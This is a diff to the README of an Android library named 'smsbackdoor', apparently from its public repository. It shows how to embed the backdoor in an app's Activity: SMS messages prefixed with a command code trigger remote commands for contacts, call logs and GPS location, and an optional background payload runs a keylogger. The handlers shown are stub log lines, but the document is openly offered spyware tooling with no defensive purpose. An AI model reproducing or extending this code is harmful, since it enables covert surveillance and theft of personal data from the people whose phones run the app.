@@ -15,18 +15,22 @@ allprojects {
 2. Add the dependency to your app's build.gradle file
 ```gradle
 dependencies {
-    implementation 'com.github.evilthreads669966:smsbackdoor:alpha-2.2'
+    implementation 'com.github.evilthreads669966:smsbackdoor:3.0'
 }
 ```
-3.  Open the binary sms backdoor inside your Activity and pass in your command code and define your remote commands handler. Make sure to request RECEIVE_SMS permission before opening it.
+3.  Open the binary sms backdoor inside your Activity and pass in your command code and define your remote commands handler. Make sure to request RECEIVE_SMS permission before opening it. You can optionally pass a payload to openDoor or not.
 ```kotlin
 //666: is the command code. So you would start all of your remote commands for example: 666: COMMAND_GET_CONTACTS
-SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
+SmsBackdoor.openDoor(this, "666:", payload = {
+    Keylogger.subscribe { entry ->
+        Log.d("KEYLOGGER", entry.toString())
+    }
+}){ remoteCommand ->
     when(remoteCommand){
-        "COMMAND_GET_CONTACTS" -> //get contacts
-        "COMMAND_GET_CALL_LOG" -> //get call log
-        "COMMAND_GET_LOCATION" -> //get gps location
-        else -> //command not found
+        "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
+        "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
+        "COMMAND_GET_LOCATION" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET GPS LOCATION")
+        else -> Log.d("SMS BACKDOOR", "COMMAND NOT FOUND")
     }
 }
 ```
@@ -35,6 +39,7 @@ SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
 - Your command handler will be executed off of the main thread.
 - You can pass openDoor a notification title and a notification body for the persistent foreground notification of your backdoor
     - All background services require a persistent foreground notification since Android Oreo 8.0
+- You can pass a function as an argument to openDoor for a payload aside from the sms backdoor to run in the background service
 ## Ask a Question?
 - Use [Github issues](https://github.com/evilthreads669966/smsbackdoor/issues)
 - Send an email to evilthreads669966@gmail.com
